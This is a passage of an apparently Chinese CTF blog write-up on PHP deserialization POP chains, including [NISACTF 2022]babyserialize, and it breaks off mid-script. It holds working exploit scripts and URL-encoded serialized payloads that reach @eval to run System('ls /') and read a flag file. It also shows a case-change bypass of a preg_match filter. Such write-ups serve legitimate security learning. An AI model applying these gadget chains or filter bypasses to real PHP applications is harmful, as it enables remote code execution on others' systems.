+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;aaaaa&#125;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w3Obj</span> = <span class="keyword">new</span> w33m();</span><br><span class="line"><span class="variable">$w2Obj</span> = <span class="keyword">new</span> w22m();</span><br><span class="line"><span class="variable">$w4Obj</span> = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line"><span class="variable">$w2Obj</span>-&gt;w00m = <span class="variable">$w3Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w00m = <span class="variable">$w4Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$w2Obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>结果如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;w44madmin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;*passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>之后由于<code>W44m</code>中<code>private</code>和<code>protected</code>的关系，打印不出来<code>\x00</code>这样的字符，所以我们需要按照规则使用<code>%00</code>进行补充</p>
+<ul>
+<li><p><code>private</code></p>
+<p>变为<code>\x00className\x00memberName</code></p>
+</li>
+<li><p><code>public</code></p>
+<p>仍然为原始的</p>
+</li>
+<li><p><code>protected</code></p>
+<p>变为<code>\x00*\x00memberName</code></p>
+</li>
+</ul>
+<p>最终得到<code>EXP</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>得到<code>flag</code></p>
+
+        <h1 id="NISACTF-2022-babyserialize"   >
+          <a href="#NISACTF-2022-babyserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1>
+      <p>依据相关代码，主要是在<code>NISA.__invoke</code>中有如下代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108113757842.png" alt="image-20230108113757842"></p>
+<p>那么只要调用到<code>NISA.__invoke</code>函数，并且控制<code>NISA.txw4ever</code>成员即可做到任意函数调用。</p>
+<p>首先给出总的函数调用链</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei.__wakeup-&gt;Ilovetxw.__call-&gt;four.__set-&gt;Ilovetxw.__toString-&gt;NISA.__invoke-&gt;@eval($this-&gt;txw4ever);</span><br></pre></td></tr></table></div></figure>
+
+<p>接下来具体分析一下</p>
+<ul>
+<li><p><code>Ilovetxw.__toString-&gt;NISA.__invoke</code></p>
+<p><code>Ilovetxw.__toString</code>方法如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108114004672.png" alt="image-20230108114004672"></p>
+<p><code>__invoke</code>性质：当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
+<p>那么通过设置<code>Ilovetxw.su</code>为某个<code>NISA</code>对应对象，即可调用到<code>NISA.__invoke</code></p>
+</li>
+<li><p><code>four.__set-&gt;Ilovetxw.__toString</code></p>
+<p><code>four.__set</code>方法如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120158522.png" alt="image-20230108120158522"></p>
+<p>这里可以看到调用了<code>strtolower($this-&gt;a)</code>，查一下手册</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strtolower.php" >PHP: strtolower - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120354823.png" alt="image-20230108120354823"></p>
+<p>可以看到会将传入变量转化为<code>String</code>，也就是说如果传入一个对象，那么就会调用该对象的<code>__toString</code>方法来将它转化为<code>String</code>。那么这里就将<code>four.a</code>设置为<code>Ilovetxw</code>对应对象，即可调用到<code>Ilovetxw.__toString</code></p>
+</li>
+<li><p><code>Ilovetxw.__call-&gt;four.__set</code></p>
+<p><code>Ilovetxw.__call</code>方法如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120814927.png" alt="image-20230108120814927"></p>
+<p><code>__set</code>的相关性质：在给不可访问的<code>protected</code>或者<code>private</code>或者不存在的属性赋值的时候，会被调用</p>
+<p>这里就可以设置<code>Ilovetxw-&gt;huang</code>为<code>four</code>的对象，而<code>four</code>中没有<code>fun</code>成员属性，所以就会调用到<code>four-&gt;__set</code>。</p>
+</li>
+<li><p><code>TianXiWei.__wakeup-&gt;Ilovetxw.__call</code></p>
+<p><code>TianXiWei.__wakeup</code>方法如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121124426.png" alt="image-20230108121124426"></p>
+<p><code>__call</code>相关性质：在对象中调用一个不可访问的方法的时候，会被执行</p>
+<p>那么可以设置<code>TianXiwei-&gt;ext</code>为<code>Ilovetxw</code>对象，而<code>Ilovetxw</code>没有<code>nisa</code>方法，就会调用到<code>Ilovetxw-&gt;__call</code>方法。</p>
+</li>
+<li><p><code>TianXiWei.__wakeup</code></p>
+<p>对于<code>__wakeup</code>的性质不用多说，在反序列化的时候就会自动调用了。</p>
+</li>
+</ul>
+<p>相关总结如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@eval($this-&gt;txw4ever);</span><br><span class="line">//设置NISA.txw4ever即可执行命令</span><br><span class="line"></span><br><span class="line">NISA.__invoke</span><br><span class="line">//通过Ilovetxw.__toString调用,需要设置IlovetxwObj.su为class NISA</span><br><span class="line">__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line"></span><br><span class="line">Ilovetxw.__toString</span><br><span class="line">//通过four.__set调用strtolower,从而调用到__toString。需要设置fourObj.a为class IlovetxwObj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">four.__set</span><br><span class="line">//通过Ilovetxw.__call调用,需要设置IlovetxwObj.huang为class four</span><br><span class="line">__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line"></span><br><span class="line">Ilovetxw.__call</span><br><span class="line">//通过TianXiWei.__wakeup调用，需要设置ext为class Ilovetxw</span><br><span class="line">__call():在对象中调用一个不可访问的方法的时候，会被执行</span><br><span class="line"></span><br><span class="line">TianXiWei.__wakeup</span><br><span class="line"></span><br><span class="line">unserialize(TianXiWei)调用TianXiWei.__wakeup</span><br></pre></td></tr></table></div></figure>
+
+<p>那么最终的<code>EXP</code></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>首先可以看看<code>hint</code>中有啥，要将<code>NISA-&gt;fun</code>设置为<code>&quot;show_me_flag&quot;</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121600420.png" alt="image-20230108121600420"></p>
+<p>结果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121739396.png" alt="image-20230108121739396"></p>
+<p>然后改掉<code>NISA-&gt;fun</code>，因为<code>hint</code>函数中有<code>die</code>函数调用</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121804523.png" alt="image-20230108121804523"></p>
+<p>看看根目录有啥</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>
+
+<p>发现有错</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121855956.png" alt="image-20230108121855956"></p>
+<p>应该是<code>checkcheck</code>函数</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121939989.png" alt="image-20230108121939989"></p>
+<p>可能是<code>preg_match</code>进行了一些过滤，这里把<code>system</code>变成大写就行，查看根目录</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22System%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108122127917.png" alt="image-20230108122127917"></p>
+<p>然后<code>cat /fllllllaaag </code>即可，最终<code>exp</code></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span 